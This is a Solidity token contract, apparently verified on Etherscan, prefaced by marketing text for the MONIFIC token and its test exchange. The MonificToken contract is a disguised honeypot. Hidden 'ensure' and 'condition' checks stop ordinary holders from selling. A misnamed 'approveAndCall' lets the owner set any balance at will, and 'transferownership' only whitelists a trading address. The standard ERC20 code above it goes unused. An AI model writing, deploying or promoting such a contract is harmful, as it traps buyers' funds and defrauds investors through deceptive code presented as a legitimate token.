/**
 *Submitted for verification at Etherscan.io on 2022-01-26
*/

/*
MONIFIC Test Platform

After months of blood, sweat and tears, MONIFIC is excited to present the release of the MONIFIC Test Platform. The primary issuance and token sale platform have been live since the private sale took place in November. Now with the release of the digital assets exchange platform, users can test the exchange!
MONIFIC is inviting developers and the investor community to access and test its exchange module and provide feature requests and suggestions for improvement. The best contributions within the following categories will be rewarded with MONIFIC awards:
Outstanding Feedback Award → 50 MONIFIC
TOP 10 Contributors → 10 MONIFIC
Most Creative Feedback → 20 MONIFIC
Funniest Feedback → 20 MONIFIC
Best Visual Feedback → 20 MONIFIC
Best Trading Feature → 20 MONIFIC
Grammar Freak Award → 20 MONIFIC
The public testing program runs from 15th of May until the 8th of June.
TEST PLATFORM
What is the MONIFIC test platform?
The MONIFIC Test Platform is a trial environment with the main purpose to receive early feedback from the people that count the most-our users.
For security reasons DO NOT use the credentials of your monifictoken.com account — you must create a dedicated test account.
What features are available on the MONIFIC test platform?
• Onboard via the KYC / AML procedure
• Buy and sell cryptocurrencies with fiat
• Trade cryptocurrencies
• Manage your fiat and crypto within the MONIFIC wallet
How can I submit feedback about the test platform?
MONIFIC strives to achieve perfection by holding true to the core values of community participation. Your feedback is central to the refinement of the platform, here is how you can help:
1. Click on the “Feedback” button
2. Click on “Submit your feedback”
3. Leave us a message!

How to Test the MONIFIC Platform?
Start your journey in three simple steps:
Complete customer on-boarding
Note: This is the test environment. Users are not obliged to provide real data or documents to verify yourselves. At the end of the onboarding, you have a button “Auto-Approve”.
Enable Two-Factor-Authentication
Load your wallet with play money
You can deposit money via a test credit card to your account wallet.

Reminder: The data on the test platform is added for presentation purposes only. Order book data represents the data of the test system. No real money (either fiat or crypto) is used — do not transfer any real money or cryptocurrencies to the addresses shown.
If you already have an account with MONIFIC, you will still need to set up a new account for the test environment. For security reasons DO NOT use the credentials of your monifictoken.com account — you must create a dedicated test account.


MONIFIC | Value behind the token
MONIFIC, the swiss start-up set to launch the Europe’s first security token exchange has engineered a seemingly unique token. MONIFIC is a hybrid payment & utility token running on the Ethereum blockchain, subject to the ERC20 token standard. MONIFIC was generated at the end of MONIFIC’s token sale in March 2019. The total supply of MONIFIC is 200'000'000 of which only 10'034'003 are in circulation. MONIFIC is currently traded on Uniswap with listing on further exchanges coming up in the next months.
With the mission to democratize access to wealth for all, MONIFIC is creating a circular token economy to enable each party involved to benefit from the ownership of MONIFIC. Below are listed the primary functions of their native cryptocurrency:
Payment
Any user can choose to pay for services on the MONIFIC Platform, such as listing fees, transaction fees, custody fees in MONIFIC. In this case the user pays 30% less fees during the first year and 20–10% less during the following years. This creates an incentive for investors to purchase MONIFIC to pay for usage of the platform.
Membership stake
The smart contract functionality of MONIFIC was audited and approved by ChainSecurity, along with staking mechanisms for the MONIFIC Platform. Staking on the platform is available threefold:
* Prime Investor Stake: 1'000
* Prime Institutional Investors Stake: 10'000
* Partner Stake: 100'000
* Prime Partner Stake: 200'000
* Contributor Stake: 250
* Service Partner Stake: 10'000
Bridge currency for trading
MONIFIC will be one of the bridge currencies listed on the MONIFIC Platform and as such will help to improve liquidity across tokenized assets. The use of a bridge currency is incentivised by the reduced transaction fees.
Survey participation and voting
In order to ensure the further development of the platform is in line with its members interests, regular surveys and voting polls are conducted. Holding MONIFIC will guarantee participation. Depending on the type of vote, the participant’s quantity of MONIFIC will be used in weighing the results.
Loyalty & Reward programs
Rewards are offered to active contributors of the platform. There are various programs for the different stakeholder groups, e.g. rewards for active investors, paybacks for asset issuers, rewards for contributors of work. Membership status is needed to access most of the reward programs.
All these features, and more to be added on a continual basis, the use cases for MONIFIC are endless. The potential of cryptocurrencies and the exchanges that host them go far beyond what we can imagine today. According to the World Economic Forum, in 5 years 10% of the global GDP will be stored on the blockchain resulting in some $10–12tn tokenized assets. The first wave of tokenization came in the form of payment tokens i.e. cryptocurrencies, the second — in utility tokens and now the fast approaching third upsurge will be security tokens. Are you ready?


MONIFIC lists on Cashierest
MONIFIC lists on Cashierest! And continues on its expansion path in South Korea, one of the few nations where investing in crypto assets is mainstream. Housewives, grandparents, millennials, boomers — people from all age groups — have invested in a cryptocurrency. According to some estimates at least 30% of South Koreans have a certain exposure to crypto assets. Korea’s leading crypto fund, Hashed estimates that number could be as high as 50% among white-collared professionals.
Yet, the country is subject to quite strict regulation in the field of cryptocurrency. ICOs are banned and opening a bank account at the same bank as the exchange you are trading is a prerequisite to registering on the exchange itself. Recently, the banks have started to crack down on exchanges as the consequence of FATF rule implementation. Read more about it here…
In this environment, MONIFIC is ideally positioned to grab the market share of non-domestic exchanges serving Korean customers. With regards to further step on how to spread the knowledge about the MONIFIC in Korea, MONIFIC has listed on Cashierest as of today. Cashierest is the fourth most prominent Korean cryptocurrency exchange, when it comes to user traffic. It currently trades over 70 coins. This should come as no surprise as a robust team of 80 employees are hustling to create a great customer experience on this exchange. MONIFIC has been working closely with Cashierest to primarily to grow brand awareness in Korea.
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract MonificToken {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}